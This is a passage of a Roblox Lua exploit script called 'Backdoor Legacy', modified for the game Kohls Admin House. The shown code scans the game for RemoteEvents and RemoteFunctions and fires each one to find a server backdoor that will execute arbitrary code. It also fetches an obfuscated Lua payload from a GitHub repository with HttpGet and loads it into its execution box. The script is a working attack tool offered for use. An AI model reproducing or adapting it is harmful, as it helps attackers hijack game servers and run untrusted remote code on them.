--[[
    ...
    it’s just a modified verision. and i DO NOT stole it.
    THE ORIGINAL SCRIPT GOES TO: https://raw.githubusercontent.com/IvanTheProtogen/BackdoorLegacy/main/main.luahttps://raw.githubusercontent.com/IvanTheProtogen/BackdoorLegacy/main/main.lua
    THIS SCRIPT IS SUPPOSED TO BE SPECIFICALLY WORKS ON KOHLS ADMIN HOUSE NP!
...
print("Backdoor Legacy // Successfully booted up! ezzz")

--[[local function debug(msg) in original script this is not a comment!!
	if 0 == 1 then 
...
Cody.Text = game:HttpGet('https://raw.githubusercontent.com/dmxxxx29/ignore-me/refs/heads/main/obf_Hv1gPSp7nEmovJI8PevTIPCrMTD25D448N2i4mAE32s9oyeKO0g9N2AojP48y1rQ.lua')
...
Execy.MouseButton1Click:Connect(function()
	...
	InvokeFunc.Event:Connect(function(rfunc,codestr2)
		...
		task.wait(0.1) -- since bro said that B)
		...
		for _, childy in inst:GetChildren() do
			...
			if childy.Parent ~= game:GetService('RobloxReplicatedStorage') then
				...
				if childy:IsA("RemoteEvent") then
					...
					--print("Backdoor Legacy // Running "..childy.ClassName..' "'..childy.Name..'".') stop fucking flood my console
...
Acqur.MouseButton1Click:Connect(function() 
	...
	if not isAcquiring then 
		...
		for i,v in pairs(game:GetDescendants()) do 
			if v.Parent ~= game:GetService('RobloxReplicatedStorage') then 
				if v:IsA("RemoteEvent") or v:IsA("RemoteFunction") then 
					--debug('Getting '..v.ClassName..' "'..v.Name..'" into RemoteList.') stop fucking flood my console
		...
		for a,b in pairs(RemoteList) do
			if AcquiredRemote == nil then 
				--print("BackdoorLegacy // Checking "..b.ClassName..' "'..b.Name..'".')  no thank u stop fucking flood my console
				...
				if b.Parent ~= game:GetService('RobloxReplicatedStorage') then 
					if b:IsA('RemoteEvent') then 
						--debug('Fired') thats good for you
		...
		if AcquiredRemote ~= nil then 
			...
			--warn('BackdoorLegacy // Remote acquired! :D') ok so cute
		else 
			isFound = false 
			Cody.Text = '-- Not found. :(' 
			warn('BackdoorLegacy // Not found. :(') -- didn't remove that!
		end 
		isAcquiring = false 
	end 
end)
